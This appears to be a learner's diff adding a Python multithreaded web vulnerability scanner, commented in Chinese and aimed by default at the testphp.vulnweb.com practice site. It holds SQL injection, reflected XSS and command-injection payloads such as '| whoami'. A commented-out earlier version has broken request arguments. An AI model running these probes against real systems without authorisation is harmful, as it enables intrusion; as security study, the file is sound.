@@ -1,0 +1,262 @@
+#多线程扫描器，
+#将多个目标塞进Queue，
+# 启动N个线程，每个线程从队列里取目标执行扫描，直到队列空
+
+# import requests
+# from threading import Thread
+# from queue import Queue
+# #补充文件读取函数，复用第二天的
+# def read_targets(file_path="targets.txt"):
+#     try:
+#         with open(file_path,"r",encoding="utf-8") as f:
+#             targets = [line.strip() for line in f if line.strip()]
+#         return targets
+#     except FileNotFoundError:
+#         print(f"错误:未找到{file_path},使用默认测试目标")
+#         return ["http://testphp.vulnweb.com/artists.php?artist="]
+#
+# class Scanner:
+#     def __init__(self,targets,thread_num=10):
+#         #1.初始化目标队列
+#         self.target_queue = Queue()
+#         for target in targets:
+#             self.target_queue.put(target)
+#         #2.线程数
+#         self.thread_num = thread_num
+#         #3.储存漏洞结果
+#         self.vuln_results = []
+#
+#     #------------------核心:POC封装-----------------------
+#     def check_sql(self,target):
+#         """SQL注入POC，布尔盲注"""
+#         payload = "1' or 1=1#"
+#         try:
+#             #关闭ssl验证+缩短超时避免卡壳
+#             resp = requests.get(
+#                 target+payload,
+#                 verift=False,
+#                 timeout=5,
+#                 heads={"User-Agent":"Mozilla/5.0"}
+#             )
+#             #靶场特征:存在artist关键词说明返回正常
+#             if "artist" in resp.text:
+#                 return f"[SQL注入]{target}"
+#         except Exception as e:
+#             return None
+#
+#     def check_xss(self,target):
+#         """XSS POC:反射型"""
+#         payload = "<script>alert('xss')</script>"
+#         test_url = f"{target}?keyword={payload}"
+#         try:
+#             resp = requests.get(test_url,verify=False,timeout=5)
+#             #payload未过滤，HTML响应
+#             if payload in resp.text and "text/html" in resp.headers.get("Content-Type",""):
+#                 return f"[XSS]{test_url}"
+#         except:
+#             return None
+#     # --------------------扫描任务 ----------------
+#     def scan_worker(self):
+#         """每个线程执行的任务，循环取队列目标扫描"""
+#         #队列不为空就一直扫描
+#         while not self.target_queue.empty():
+#             target = self.target_queue.get()
+#             print(f"[扫描中]{target}")
+#             #执行POC
+#             sql_res = self.check_sql(target)
+#             xss_res = self.check_xss(target)
+#             #收集信息
+#             for res in [sql_res,xss_res]:
+#                 if res:
+#                     self.vuln_results.append(res)
+#                     print(f"[发现漏洞]{res}")
+#             #标记任务完成
+#             self.target_queue.task_done()
+#
+#     # ---------------------启动扫描 --------------
+#     def run(self):
+#         """启动所有线程,等待扫描完成"""
+#         print(f"===启动多线程扫描器===")
+#         print(f"线程数:{self.thread_num} | 目标数：{self.target_queue.qsize()}")
+#         #启动线程持
+#         for _ in range(self.thread_num):
+#             t = Thread(target=self.scan_worker)
+#             t.daemon = True
+#             t.start()
+#
+#         #等待队列所有任务完成
+#         self.target_queue.join()
+#         #输出最终结果
+#         print(f"\n===扫描完成===")
+#         if self.vuln_results:
+#             print("漏洞汇总:")
+#             for res in self.vuln_results:
+#                 print(res)
+#         else:
+#             print("未发现漏洞")
+# #运行扫描器
+# if __name__ == "__main__":
+#     targets = read_targets()
+#     scanner = Scanner(targets,thread_num=5)
+#     scanner.run()
+
+#===============================优化版====================================
+# SharpScan v0.1 - 轻量级多线程漏洞扫描器
+# 功能：SQL布尔盲注+SQL时间盲注+反射型XSS+命令注入
+import requests
+from threading import Thread
+from queue import Queue
+import re
+import time
+
+# 禁用requests警告（HTTPS证书错误）
+requests.packages.urllib3.disable_warnings()
+
+
+class SharpScan:
+    def __init__(self, targets, thread_num=10):
+        self.target_queue = Queue()
+        for t in targets:
+            self.target_queue.put(t)
+        self.thread_num = thread_num
+        self.vuln_results = []  # 漏洞结果列表
+
+    # ========================== POC模块（可无限扩展） ==========================
+    def poc_sql_bool(self, url):
+        """POC1：SQL布尔盲注（长度差异判断）"""
+        payload_true = "1' and 1=1#"
+        payload_false = "1' and 1=2#"
+        try:
+            resp1 = requests.get(url + payload_true, verify=False, timeout=5)
+            resp2 = requests.get(url + payload_false, verify=False, timeout=5)
+            if abs(len(resp1.text) - len(resp2.text)) > 50:
+                return f"[SQL布尔盲注] {url}"
+        except:
+            return None
+
+    def poc_sql_time(self, url):
+        """POC2：SQL时间盲注（延迟判断）"""
+        payload = "1' and sleep(3)#"  # 缩短延迟到3秒（避免超时）
+        start = time.time()
+        try:
+            requests.get(url + payload, verify=False, timeout=8)  # 超时设8秒（留余量）
+            end = time.time()
+            if end - start > 3:  # 实际延迟超过3秒=存在漏洞
+                return f"[SQL时间盲注] {url}"
+        except:
+            return None
+
+    def poc_xss_reflect(self, url):
+        """POC3：反射型XSS（多payload覆盖）"""
+        payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",  # 绕过<script>过滤的payload
+            "<svg onload=alert(1)>"  # SVG XSS
+        ]
+        for payload in payloads:
+            test_url = f"{url}?keyword={payload}"
+            try:
+                resp = requests.get(test_url, verify=False, timeout=5)
+                if payload in resp.text and "text/html" in resp.headers.get("Content-Type", ""):
+                    return f"[反射型XSS] {test_url}"
+            except:
+                continue
+        return None
+
+    def poc_cmd_injection(self, url):
+        """POC4：命令注入（匹配系统命令输出特征）"""
+        # 区分Windows/Linux payload
+        payloads = ["| whoami", "; ipconfig", "& dir"]
+        for payload in payloads:
+            test_url = f"{url}?cmd={payload}"
+            try:
+                resp = requests.get(test_url, verify=False, timeout=5)
+                # 匹配Windows特征（IP地址、用户名、目录列表）
+                if re.search(r"IPv4|Administrator|C:\\|Users", resp.text):
+                    return f"[命令注入] {test_url}"
+            except:
+                continue
+        return None
+
+    # ========================== 扫描任务 ==========================
+    def scan_worker(self):
+        while not self.target_queue.empty():
+            target = self.target_queue.get()
+            print(f"[扫描] {target}")
+            # 执行所有POC
+            poc_list = [
+                self.poc_sql_bool(target),
+                self.poc_sql_time(target),
+                self.poc_xss_reflect(target),
+                self.poc_cmd_injection(target)
+            ]
+            # 收集有效结果
+            for res in poc_list:
+                if res:
+                    self.vuln_results.append(res)
+                    print(f"[漏洞] {res}")
+            self.target_queue.task_done()
+
+    # ========================== 启动扫描 ==========================
+    def run(self):
+        print(f"=== SharpScan v0.1 启动 ===")
+        print(f"线程数：{self.thread_num} | 目标数：{self.target_queue.qsize()}")
+        start_time = time.time()
+
+        # 启动线程池
+        for _ in range(self.thread_num):
+            t = Thread(target=self.scan_worker)
+            t.daemon = True
+            t.start()
+
+        # 等待扫描完成
+        self.target_queue.join()
+        end_time = time.time()
+
+        # 输出汇总
+        print(f"\n=== 扫描完成 | 耗时：{end_time - start_time:.2f}秒 ===")
+        if self.vuln_results:
+            print("漏洞汇总：")
+            for idx, res in enumerate(self.vuln_results, 1):
+                print(f"{idx}. {res}")
+        else:
+            print("未发现任何漏洞")
+
+
+# ========================== 主函数 ==========================
+if __name__ == "__main__":
+    # 1. 从文件读目标（优先），无则用测试目标
+    try:
+        with open("targets.txt", "r", encoding="utf-8") as f:
+            targets = [line.strip() for line in f if line.strip()]
+    except:
+        targets = [
+            "http://testphp.vulnweb.com/artists.php?artist=",
+            "http://testphp.vulnweb.com/search.php?test=query"
+        ]
+
+    # 2. 启动扫描器（线程数设5，避免被靶场拦截）
+    scanner = SharpScan(targets, thread_num=5)
+    scanner.run()
+
+    # 3. 可选：保存结果到文件（复用第二天的save_vuln_result）
+    from datetime import datetime
+    import os
+
+
+    def save_result(results):
+        if not results:
+            return
+        if not os.path.exists("reports"):
+            os.makedirs("reports")
+        file_path = f"reports/{datetime.now().strftime('%Y%m%d')}_sharpscan.txt"
+        with open(file_path, "a", encoding="utf-8") as f:
+            f.write(f"扫描时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"目标数：{len(targets)}\n")
+            f.write("漏洞结果：\n")
+            for res in results:
+                f.write(f"- {res}\n")
+        print(f"\n结果已保存到：{file_path}")
+
+
+    save_result(scanner.vuln_results)
